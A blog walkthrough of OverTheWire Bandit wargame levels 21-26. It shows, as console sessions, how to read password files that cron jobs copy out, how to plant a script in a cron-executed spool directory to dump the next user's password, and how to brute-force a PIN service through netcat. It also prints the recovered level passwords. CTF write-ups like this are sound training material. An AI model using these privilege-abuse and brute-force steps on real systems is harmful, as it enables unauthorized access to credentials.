---
layout: post
title: "OverTheWire: Bandit 21-26"
date: 2016-10-21 12:00:00
share: true
comments: true
tags: [OverTheWire - Bandit]
---

## Bandit 21

Very easy level, you'll need to read about cron, but for now first paragraph of this [link ](https://help.ubuntu.com/community/CronHowto)will do:

```
 "Cron is a system daemon used to execute desired tasks (in the background) at
 designated times.
 
 A crontab file is a simple text file containing a list of commands meant to be
 run at specified times. It is edited using the crontab command. The commands
 in the crontab file (and their run times) are checked by the cron daemon,
 which executes them in the system background."
```

First, let's see which cron job is being executed for bandit 22:


```console
bandit21@melinda:~$ cd /etc/cron.d
bandit21@melinda:/etc/cron.d$ ls
behemoth4_cleanup cronjob_bandit23    leviathan5_cleanup  natas-session-toucher natas25_cleanup~ php5    semtex0-ppc vortex0
cron-apt      cronjob_bandit24    manpage3_resetpw_job natas-stats      natas26_cleanup  semtex0-32 semtex5   vortex20
cronjob_bandit22  cronjob_bandit24_root melinda-stats     natas25_cleanup    natas27_cleanup  semtex0-64 sysstat

bandit21@melinda:/etc/cron.d$ cat cronjob_bandit2
cat: cronjob_bandit2: No such file or directory
bandit21@melinda:/etc/cron.d$ cat cronjob_bandit22
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
```

What does `/usr/bin/cronjob_bandit22.sh` do?

```console
bandit21@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

First line after the sha-bang gives the temp file the following permissions: user can write, anyone can read. So we're able to read the content of that file.
Second line copies the content of /etc/bandit_pass/bandit22 (containing our password) to the temporary file. Check it's content and you'll find the password to the next level!

Password: `Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI`

___________________________________________

## Bandit 22

Same steps as earlier, let's see what the script /usr/bin/cronjob_bandit23.sh
does:

```console
bandit22@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash
myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

So we need to get the MD5 encoding of $target (which is "I am user bandit23"),
then read the content of `/tmp/MD5output`:

```console
bandit22@melinda:/etc/cron.d$ md5sum <<< $(echo I am user bandit23)
8ca319486bfbbc3663ea0fbe81326349 -
bandit22@melinda:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
bandit22@melinda:/etc/cron.d$
```

___________________________________________

## Bandit 23

More of the same, let's see what the script does:

```console
bandit23@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash
myname=$(whoami)
cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
if [ "$i" != "." -a "$i" != ".." ];
then
echo "Handling $i"
timeout -s 9 60 "./$i"
rm -f "./$i"
fi
done
```

So it navigates to `/var/spool/bandit24` directory and executes all scripts as bandit24. Alright, so we need to make it write the content of `/etc/bandit_pass/bandit24` somewhere, maybe a temporary file? Make sure you give the script and the folder the correct permissions.

```console
bandit23@melinda:/etc/cron.d$ mkdir /tmp/somefunnyname
bandit23@melinda:/etc/cron.d$ chmod 777 /tmp/somefunnyname
bandit23@melinda:/etc/cron.d$ cd /tmp/somefunnyname
bandit23@melinda:/tmp/somefunnyname$ cat > torun.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/somefunnyname/password
^C
bandit23@melinda:/tmp/somefunnyname$ chmod 777 torun.sh
bandit23@melinda:/tmp/somefunnyname$ cp torun.sh /var/spool/bandit24/
bandit23@melinda:/tmp/somefunnyname$ ls -al /var/spool/bandit24/
total 153
drwxrwxrwx 2 bandit24 bandit23 151552 Oct 21 23:08 .
drwxr-xr-x 6 root   root    4096 May 3 2015 ..
bandit23@melinda:/tmp/somefunnyname$ ls
password torun.sh
bandit23@melinda:/tmp/somefunnyname$ cat password
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

Script got deleted, which means cron executed it and we got our password!

___________________________________________

## Bandit 24

Our first bash for loop! You may want to read more about it [here](http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO-7.html).

First let's see how the daemon behaves. You'll realize it allows multiple input, we can create a list with format "&lt;password&gt; &lt;pin&gt;" for 0000-9999 and feed it to NC. Let's create a temp directory and navigate to it:

```console
bandit24@melinda:/tmp/abatchy24$ `for i in $(seq 0000 9999); do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i >>list.txt; done  `
bandit24@melinda:/tmp/abatchy24$ `head list.txt`
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 2
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 3
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 4
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 6
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 7
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 8
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9
bandit24@melinda:/tmp/abatchy24$ `tail list.txt`
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9990
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9991
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9992
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9993
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9994
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9995
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9996
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9997
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9998
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9999
bandit24@melinda:/tmp/abatchy24$ `nc -nv 127.0.0.1 30002 < list.txt | grep -v Wrong`
Connection to 127.0.0.1 30002 port [tcp/*] succeeded!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
Exiting.
```

Done.

___________________________________________

## Bandit 25

Just another SSH key, but you may want to look into /etc/passwd file...

___________________________________________

## Bandit 26

Research escaping restrcited shell ;)